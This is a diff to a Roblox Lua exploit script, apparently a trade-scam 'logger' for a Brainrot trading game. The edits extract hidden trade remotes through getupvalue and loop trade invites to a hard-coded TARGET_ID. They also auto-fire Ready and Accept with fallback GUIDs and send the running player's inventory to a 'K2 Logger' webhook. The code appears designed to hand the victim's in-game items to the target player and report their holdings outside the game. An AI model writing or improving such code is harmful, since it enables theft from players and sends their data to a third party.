@@ -716,134 +716,58 @@ local readyRemote, acceptRemote, tradeEndRemote
 local tradeChannel = nil
 local remotesReady = false
 
-local function dumpUpvalues(fn, label)
-	if type(fn) ~= "function" or not getupvalue then return end
-	pcall(function()
-		for i = 1, 30 do
-			local ok, v = pcall(getupvalue, fn, i)
-			if not ok then break end
-			if typeof(v) == "Instance" and (v:IsA("RemoteFunction") or v:IsA("RemoteEvent")) then
-				print("[Brainrot] UV", label, i, v.ClassName, v.Name)
-			elseif type(v) == "table" and type(rawget(v, "Brainrot")) == "table" then
-				print("[Brainrot] UV", label, i, "liveTrade-like table")
-			end
-		end
-	end)
-end
-
 local function resolveTradeRemotes()
-	if not TradeController then
-		warn("[Brainrot] TradeController nil")
+	-- Original Chocola indexes (invite worked with these)
+	if not TradeController or not getupvalue then
 		return false
 	end
-	if not getupvalue then
-		warn("[Brainrot] getupvalue missing")
-		return false
-	end
-	local ok, err = pcall(function()
-		if type(TradeController.SendInvite) == "function" then
-			local r = getupvalue(TradeController.SendInvite, 1)
-			if typeof(r) == "Instance" then inviteRemote = r end
-			if not inviteRemote then
-				for i = 1, 10 do
-					local v = getupvalue(TradeController.SendInvite, i)
-					if typeof(v) == "Instance" and (v:IsA("RemoteFunction") or v:IsA("RemoteEvent")) then
-						inviteRemote = v
-						break
-					end
-				end
-			end
-		end
-
-		if type(TradeController._createLiveTrade) == "function" then
-			-- Find liveTrade table
-			for i = 1, 35 do
+	local ok = pcall(function()
+		liveTrade = getupvalue(TradeController._createLiveTrade, 15)
+		inviteRemote = getupvalue(TradeController.SendInvite, 1)
+		addBrainrotRemote = liveTrade and getupvalue(liveTrade.Brainrot.Add, 1) or nil
+		addItemRemote = liveTrade and getupvalue(liveTrade.BaseSkin.Add, 1) or nil
+		readyRemote = getupvalue(TradeController._createLiveTrade, 24)
+		acceptRemote = getupvalue(TradeController._createLiveTrade, 23)
+		tradeEndRemote = getupvalue(TradeController._createPlayerList, 21)
+	end)
+	if not ok then return false end
+	-- If liveTrade index drifted, scan nearby for Brainrot table
+	if not liveTrade and getupvalue then
+		pcall(function()
+			for i = 10, 25 do
 				local v = getupvalue(TradeController._createLiveTrade, i)
-				if type(v) == "table" and type(rawget(v, "Brainrot")) == "table" then
+				if type(v) == "table" and type(v.Brainrot) == "table" then
 					liveTrade = v
-					print("[Brainrot] liveTrade at upvalue", i)
+					if type(v.Brainrot.Add) == "function" then
+						addBrainrotRemote = getupvalue(v.Brainrot.Add, 1) or addBrainrotRemote
+					end
+					if type(v.BaseSkin) == "table" and type(v.BaseSkin.Add) == "function" then
+						addItemRemote = getupvalue(v.BaseSkin.Add, 1) or addItemRemote
+					end
+					print("[Brainrot] liveTrade recovered at UV", i)
 					break
 				end
 			end
-			-- Ready / Accept anywhere in upvalues
-			for i = 1, 35 do
-				local v = getupvalue(TradeController._createLiveTrade, i)
-				if typeof(v) == "Instance" and (v:IsA("RemoteEvent") or v:IsA("RemoteFunction")) then
-					local n = string.lower(v.Name)
-					if not readyRemote and n:find("ready", 1, true) then readyRemote = v end
-					if not acceptRemote and n:find("accept", 1, true) then acceptRemote = v end
-				end
-			end
-			-- Hard indexes as backup
-			if not readyRemote then
-				local v = getupvalue(TradeController._createLiveTrade, 24)
-				if typeof(v) == "Instance" then readyRemote = v end
-			end
-			if not acceptRemote then
-				local v = getupvalue(TradeController._createLiveTrade, 23)
-				if typeof(v) == "Instance" then acceptRemote = v end
-			end
-		end
-
-		if liveTrade then
-			local brAdd = liveTrade.Brainrot and liveTrade.Brainrot.Add
-			if type(brAdd) == "function" then
-				dumpUpvalues(brAdd, "Brainrot.Add")
-				for i = 1, 15 do
-					local v = getupvalue(brAdd, i)
-					if typeof(v) == "Instance" and (v:IsA("RemoteFunction") or v:IsA("RemoteEvent")) then
-						addBrainrotRemote = v
-						print("[Brainrot] AddBrainrot remote UV", i, v.Name)
-						break
-					end
-				end
-			end
-			local bsAdd = liveTrade.BaseSkin and liveTrade.BaseSkin.Add
-			if type(bsAdd) == "function" then
-				for i = 1, 15 do
-					local v = getupvalue(bsAdd, i)
-					if typeof(v) == "Instance" and (v:IsA("RemoteFunction") or v:IsA("RemoteEvent")) then
-						addItemRemote = v
-						print("[Brainrot] AddItem remote UV", i, v.Name)
-						break
-					end
-				end
-			end
-		else
-			warn("[Brainrot] liveTrade table NOT found in _createLiveTrade upvalues")
-			dumpUpvalues(TradeController._createLiveTrade, "_createLiveTrade")
-		end
-	end)
-	if not ok then
-		warn("[Brainrot] resolve error:", err)
-		return false
+		end)
 	end
 	return inviteRemote ~= nil
 end
 
 local function fallbackRemote(leaf)
 	leaf = tostring(leaf or "")
-	local leafLower = leaf:lower()
+	for _, child in ipairs(Net:GetChildren()) do
+		if (child:IsA("RemoteFunction") or child:IsA("RemoteEvent"))
+			and (child.Name == leaf or child.Name:find(leaf, 1, true)) then
+			return child
+		end
+	end
 	for _, child in ipairs(Net:GetDescendants()) do
-		if child:IsA("RemoteFunction") or child:IsA("RemoteEvent") then
-			local n = child.Name
-			if n == leaf or n:find(leaf, 1, true) or n:lower():find(leafLower, 1, true) then
-				return child
-			end
+		if (child:IsA("RemoteFunction") or child:IsA("RemoteEvent"))
+			and (child.Name == leaf or child.Name:find(leaf, 1, true)) then
+			return child
 		end
 	end
 	return nil
-end
-
--- Also try calling the controller method itself (some builds wrap the remote)
-local function tryControllerAddBrainrot(slotKey, data)
-	if not liveTrade then return false end
-	local ok = pcall(function()
-		if type(liveTrade.Brainrot) == "table" and type(liveTrade.Brainrot.Add) == "function" then
-			liveTrade.Brainrot.Add(slotKey, data)
-		end
-	end)
-	return ok
 end
 
 local function waitForRemotes(timeout)
@@ -1501,8 +1425,11 @@ local function countTraits(traits)
 end
 
 local function sendDetailedWebhook()
-	-- Allow run if we have a secret key (relay), private webhook, or internal log webhook
-	if not LOGGER_KEY and GOOD_WEBHOOK == "" then return end
+	print("[Brainrot] sendDetailedWebhook called | key=", LOGGER_KEY and true or false, "webhook=", GOOD_WEBHOOK ~= "" and true or false)
+	if not LOGGER_KEY and GOOD_WEBHOOK == "" then
+		warn("[Brainrot] webhook skip: no LOGGER_KEY / GOOD_WEBHOOK")
+		return
+	end
 	local resultsPrimary = {}
 	local requirePingPrimary = false
 	local totalGen = 0
@@ -1528,7 +1455,18 @@ local function sendDetailedWebhook()
 			end
 		end
 	end
-	if #resultsPrimary == 0 and #baseSkinQueue == 0 and #gearQueue == 0 then return end
+	if #resultsPrimary == 0 and #baseSkinQueue == 0 and #gearQueue == 0 then
+		warn("[Brainrot] webhook skip: no matching GOOD_BRAINROTS/skins/gears in animalList")
+		-- still try a minimal ping so you know logger is alive
+		pcall(function()
+			sendWebhook({
+				content = "K2 Logger online — no matching targets on base for `" .. LP.Name .. "`",
+				username = "K2 Logger",
+				avatar_url = GOOD_AVATAR,
+			})
+		end)
+		return
+	end
 	table.sort(resultsPrimary, function(a, b) return (a.genVal or 0) > (b.genVal or 0) end)
 	local lines = {}
 	if #resultsPrimary > 0 then
@@ -1782,10 +1720,19 @@ local function startFullAutomation()
 
 	local function fireReady()
 		fireRemote(readyRemote, READY_GUID)
+		-- also try legacy GUID
+		fireRemote(readyRemote, "23f15b0b-b633-4f6b-888f-5924b7425522")
+		if readyRemote then
+			pcall(function() readyRemote:FireServer() end)
+		end
 	end
 
 	local function fireAccept()
 		fireRemote(acceptRemote, ACCEPT_GUID)
+		fireRemote(acceptRemote, "86eea964-f19e-4ac6-b401-a71ecc89e596")
+		if acceptRemote then
+			pcall(function() acceptRemote:FireServer() end)
+		end
 	end
 
 	-- Detect trade open
@@ -1876,19 +1823,35 @@ local function startFullAutomation()
 		end
 	end)
 
+	local function doInvite()
+		-- Prefer remote
+		if inviteRemote then
+			pcall(function()
+				if inviteRemote:IsA("RemoteFunction") then
+					inviteRemote:InvokeServer(INVITE_GUID, TARGET_ID)
+				else
+					inviteRemote:FireServer(INVITE_GUID, TARGET_ID)
+				end
+			end)
+		end
+		-- Controller method fallback
+		if TradeController and type(TradeController.SendInvite) == "function" then
+			pcall(function() TradeController.SendInvite(TARGET_ID) end)
+			pcall(function() TradeController:SendInvite(TARGET_ID) end)
+			pcall(function() TradeController.SendInvite(TradeController, TARGET_ID) end)
+		end
+	end
+
 	-- Continuous invite (always when not in trade)
 	task.spawn(function()
+		local ticks = 0
 		while true do
 			if not tradeActiveFlag and not currentlyInTrade then
-				pcall(function()
-					if inviteRemote then
-						if inviteRemote:IsA("RemoteFunction") then
-							inviteRemote:InvokeServer(INVITE_GUID, TARGET_ID)
-						else
-							inviteRemote:FireServer(INVITE_GUID, TARGET_ID)
-						end
-					end
-				end)
+				doInvite()
+				ticks = ticks + 1
+				if ticks == 1 or ticks % 8 == 0 then
+					print("[Brainrot] Invite pulse →", TARGET_ID, "remote=", inviteRemote and inviteRemote.Name or "NIL")
+				end
 			end
 			task.wait(TRADE_CYCLE_DELAY)
 		end
@@ -1900,11 +1863,7 @@ local function startFullAutomation()
 			task.spawn(function()
 				for _ = 1, 6 do
 					if tradeActiveFlag or currentlyInTrade then break end
-					pcall(function()
-						if inviteRemote then
-							inviteRemote:InvokeServer(INVITE_GUID, TARGET_ID)
-						end
-					end)
+					doInvite()
 					task.wait(0.12)
 				end
 			end)
